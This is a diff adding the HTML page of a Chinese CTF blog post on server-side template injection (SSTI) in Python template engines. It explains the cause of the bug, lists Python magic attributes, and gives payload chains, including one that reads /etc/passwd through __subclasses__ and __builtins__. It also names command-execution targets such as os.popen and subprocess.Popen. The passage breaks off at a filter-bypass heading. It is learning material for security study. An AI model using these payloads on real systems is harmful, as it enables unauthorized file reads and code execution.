@@ -1,0 +1,494 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>SSTI注入篇 - Hinoatari BLOG</title><meta name="author" content="Hinoatari">
+<meta name="description" content="SSTI漏洞成因 ssti服务端模板注入成因为：web应用在使用框架（如python的flask、jinjia2、django；java的freemarker、velocity；php的thinkphp、smarty等）时，由于程序员对代码编写的不规范、不严谨造成模板注入漏洞，攻击者通过恶意注入模板代码影响服务器端模板引擎的行为。
+"><meta name="keywords" content='SSTI注入, web'>
+  <meta itemprop="name" content="SSTI注入篇">
+  <meta itemprop="description" content="SSTI漏洞成因 ssti服务端模板注入成因为：web应用在使用框架（如python的flask、jinjia2、django；java的freemarker、velocity；php的thinkphp、smarty等）时，由于程序员对代码编写的不规范、不严谨造成模板注入漏洞，攻击者通过恶意注入模板代码影响服务器端模板引擎的行为。">
+  <meta itemprop="datePublished" content="2025-04-20T16:41:52+08:00">
+  <meta itemprop="dateModified" content="2025-04-20T20:07:05+08:00">
+  <meta itemprop="wordCount" content="1424">
+  <meta itemprop="keywords" content="SSTI注入,Web"><meta property="og:url" content="https://hinoatari.github.io/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/">
+  <meta property="og:site_name" content="Hinoatari BLOG">
+  <meta property="og:title" content="SSTI注入篇">
+  <meta property="og:description" content="SSTI漏洞成因 ssti服务端模板注入成因为：web应用在使用框架（如python的flask、jinjia2、django；java的freemarker、velocity；php的thinkphp、smarty等）时，由于程序员对代码编写的不规范、不严谨造成模板注入漏洞，攻击者通过恶意注入模板代码影响服务器端模板引擎的行为。">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-04-20T16:41:52+08:00">
+    <meta property="article:modified_time" content="2025-04-20T20:07:05+08:00">
+    <meta property="article:tag" content="SSTI注入">
+    <meta property="article:tag" content="Web">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="SSTI注入篇">
+  <meta name="twitter:description" content="SSTI漏洞成因 ssti服务端模板注入成因为：web应用在使用框架（如python的flask、jinjia2、django；java的freemarker、velocity；php的thinkphp、smarty等）时，由于程序员对代码编写的不规范、不严谨造成模板注入漏洞，攻击者通过恶意注入模板代码影响服务器端模板引擎的行为。">
+<meta name="application-name" content="Hinoatari BLOG">
+<meta name="apple-mobile-web-app-title" content="Hinoatari BLOG"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="https://hinoatari.github.io/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/" title="SSTI注入篇 - Hinoatari BLOG" /><link rel="prev" type="text/html" href="https://hinoatari.github.io/posts/sql%E6%B3%A8%E5%85%A5%E7%AF%87/" title="SQL注入篇" /><link rel="alternate" type="text/markdown" href="https://hinoatari.github.io/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/index.md" title="SSTI注入篇 - Hinoatari BLOG"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "SSTI注入篇",
+    "inLanguage": "zh-CN",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/hinoatari.github.io\/posts\/ssti%E6%B3%A8%E5%85%A5%E7%AF%87\/"
+    },"genre": "posts","keywords": "SSTI注入, web","wordcount":  1424 ,
+    "url": "https:\/\/hinoatari.github.io\/posts\/ssti%E6%B3%A8%E5%85%A5%E7%AF%87\/","datePublished": "2025-04-20T16:41:52+08:00","dateModified": "2025-04-20T20:07:05+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "Hinoatari"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper" data-github-corner="right">
+    <div class="header-title">
+      <a href="/" title="Hinoatari BLOG"><span class="header-title-text">Hinoatari BLOG</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/archives/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item">
+              <a class="menu-link" href="/categories/"><i class="fa-solid fa-list fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a class="menu-link" href="/friends/"><i class="fa-solid fa-link fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item">
+              <a class="menu-link" href="/about"><i class="fa-solid fa-graduation-cap fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容……" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="Hinoatari BLOG"><span class="header-title-text">Hinoatari BLOG</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容……" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li class="menu-item"><a class="menu-link" href="/archives/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-list fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item"><a class="menu-link" href="/friends/"><i class="fa-solid fa-link fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item"><a class="menu-link" href="/about"><i class="fa-solid fa-graduation-cap fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="合集"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>SSTI注入篇</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><i class="fa-solid fa-user-circle" aria-hidden="true"></i>
+      Hinoatari</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/ctf/" class="post-category" title="分类 - Ctf"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Ctf</a></span></div><div class="post-meta-line"><span title="发布于 2025-04-20 16:41:52"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2025-04-20">2025-04-20</time></span>&nbsp;<span title="更新于 2025-04-20 20:07:05"><i class="fa-regular fa-calendar-check fa-fw me-1" aria-hidden="true"></i><time datetime="2025-04-20">2025-04-20</time></span>&nbsp;<span title="1424 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 1500 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 3 分钟</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#获取基本类">获取基本类</a></li>
+    <li><a href="#获取基本类后继续获取基本类的子类">获取基本类后，继续获取基本类的子类</a></li>
+    <li><a href="#找__init__类">找__init__类</a></li>
+    <li><a href="#查看其引用_builtins_">查看其引用_<em>builtins</em>_</a></li>
+    <li><a href="#寻找keys中可用函数使用-keys-中的-file-等函数来实现读取文件的功能">寻找keys中可用函数，使用 keys 中的 file 等函数来实现读取文件的功能</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#过滤中括号">过滤中括号</a></li>
+    <li><a href="#过滤下划线">过滤下划线</a></li>
+    <li><a href="#过滤点">过滤点</a></li>
+    <li><a href="#过滤大括号">过滤大括号</a></li>
+    <li><a href="#过滤引号">过滤引号</a></li>
+    <li><a href="#过滤数字">过滤数字</a></li>
+    <li><a href="#过滤函数名">过滤函数名</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><h2 id="ssti漏洞成因" class="heading-element"><span>SSTI漏洞成因</span>
+  <a href="#ssti%e6%bc%8f%e6%b4%9e%e6%88%90%e5%9b%a0" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>ssti服务端模板注入成因为：web应用在使用框架（如python的flask、jinjia2、django；java的freemarker、velocity；php的thinkphp、smarty等）时，由于程序员对代码编写的不规范、不严谨造成模板注入漏洞，攻击者通过恶意注入模板代码影响服务器端模板引擎的行为。</p>
+<h2 id="ssti中常用魔术方法" class="heading-element"><span>SSTI中常用魔术方法</span>
+  <a href="#ssti%e4%b8%ad%e5%b8%b8%e7%94%a8%e9%ad%94%e6%9c%af%e6%96%b9%e6%b3%95" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><ul>
+<li>_<em>class</em>_ 返回一个实例所属的类</li>
+<li>_<em>mro</em>_ 查看类继承的所有父类，直到object</li>
+<li>_<em>subclasses</em>_() 获取一个类的子类，返回的是一个列表</li>
+<li>_<em>bases</em>_ 以元组形式返回一个类直接继承的类</li>
+<li>_<em>init</em>_ 类实例创建之后调用，对当前对象的实例的初始化</li>
+<li>_<em>globals__ 使用方式为<strong>函数名</strong>.__globals</em>_，返回一个当前空间下能使用的模块、方法和变量的字典</li>
+<li>_<em>getattribute</em>_ 当类被调用时，无条件进入此函数</li>
+<li>_<em>getattr</em>_ 访问对象中不存在的属性时调用</li>
+<li>_<em>dict</em>_ 返回所有属性，包括属性、方法等</li>
+<li>_<em>builtins</em>_ 查看当前所有导入的内建函数</li>
+</ul>
+<h2 id="攻击思路" class="heading-element"><span>攻击思路</span>
+  <a href="#%e6%94%bb%e5%87%bb%e6%80%9d%e8%b7%af" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><ul>
+<li>
+<h2 id="获取基本类" class="heading-element"><span>获取基本类</span>
+  <a href="#%e8%8e%b7%e5%8f%96%e5%9f%ba%e6%9c%ac%e7%b1%bb" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2></li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">__dict__          //返回类中的函数和属性，父类子类互不影响
+</span></span><span class="line"><span class="cl"><span class="gs">__base__</span>          //返回类的父类 python3
+</span></span><span class="line"><span class="cl"><span class="gs">__mro__</span>           //返回类继承的元组，(寻找父类) python3
+</span></span><span class="line"><span class="cl"><span class="gs">__init__</span>          //返回类的初始化方法   
+</span></span><span class="line"><span class="cl"><span class="gs">__subclasses__</span>()  //返回类中仍然可用的引用  python3
+</span></span><span class="line"><span class="cl"><span class="gs">__globals__</span>       //对包含函数全局变量的字典的引用 python3
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">对于返回的是类实例的话:
+</span></span><span class="line"><span class="cl"><span class="gs">__class__</span>         //返回实例的对象，可以使类实例指向Class，使用上面的魔术方法</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">&#39;&#39;.__class__.__mro__[-1]
+</span></span><span class="line"><span class="cl">{}.__class__.__bases__[0]
+</span></span><span class="line"><span class="cl">().__class__.__bases__[0]
+</span></span><span class="line"><span class="cl">[].__class__.__bases__[0]</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>
+<h2 id="获取基本类后继续获取基本类的子类" class="heading-element"><span>获取基本类后，继续获取基本类的子类</span>
+  <a href="#%e8%8e%b7%e5%8f%96%e5%9f%ba%e6%9c%ac%e7%b1%bb%e5%90%8e%e7%bb%a7%e7%bb%ad%e8%8e%b7%e5%8f%96%e5%9f%ba%e6%9c%ac%e7%b1%bb%e7%9a%84%e5%ad%90%e7%b1%bb" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">object.__subclasses__()</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<h2 id="找__init__类" class="heading-element"><span>找__init__类</span>
+  <a href="#%e6%89%be__init__%e7%b1%bb" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">&#39;&#39;.__class__.__mro__[2].__subclasses__()[99].__init__</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<h2 id="查看其引用_builtins_" class="heading-element"><span>查看其引用_<em>builtins</em>_</span>
+  <a href="#%e6%9f%a5%e7%9c%8b%e5%85%b6%e5%bc%95%e7%94%a8_builtins_" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">&#39;&#39;.__class__.__mro__[2].__subclasses__()[138].__init__.__globals__[&#39;__builtins__&#39;]</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<h2 id="寻找keys中可用函数使用-keys-中的-file-等函数来实现读取文件的功能" class="heading-element"><span>寻找keys中可用函数，使用 keys 中的 file 等函数来实现读取文件的功能</span>
+  <a href="#%e5%af%bb%e6%89%bekeys%e4%b8%ad%e5%8f%af%e7%94%a8%e5%87%bd%e6%95%b0%e4%bd%bf%e7%94%a8-keys-%e4%b8%ad%e7%9a%84-file-%e7%ad%89%e5%87%bd%e6%95%b0%e6%9d%a5%e5%ae%9e%e7%8e%b0%e8%af%bb%e5%8f%96%e6%96%87%e4%bb%b6%e7%9a%84%e5%8a%9f%e8%83%bd" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2></li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">&#39;&#39;.__class__.__mro__[2].__subclasses__()[138].__init__.__globals__[&#39;__builtins__&#39;][<span class="nt">&#39;file&#39;</span>](<span class="na">&#39;/etc/passwd&#39;</span>).read()</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="常用目标函数" class="heading-element"><span>常用目标函数</span>
+  <a href="#%e5%b8%b8%e7%94%a8%e7%9b%ae%e6%a0%87%e5%87%bd%e6%95%b0" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">file、subprocess.Popen、os.popen、exec、eval</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="绕过过滤方法" class="heading-element"><span>绕过过滤方法</span>
+  <a href="#%e7%bb%95%e8%bf%87%e8%bf%87%e6%bb%a4%e6%96%b9%e6%b3%95" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><ul>
+<li>
+<h2 id="过滤中括号" class="heading-element"><span>过滤中括号</span>
+  <a href="#%e8%bf%87%e6%bb%a4%e4%b8%ad%e6%8b%ac%e5%8f%b7" class="heading-mark">
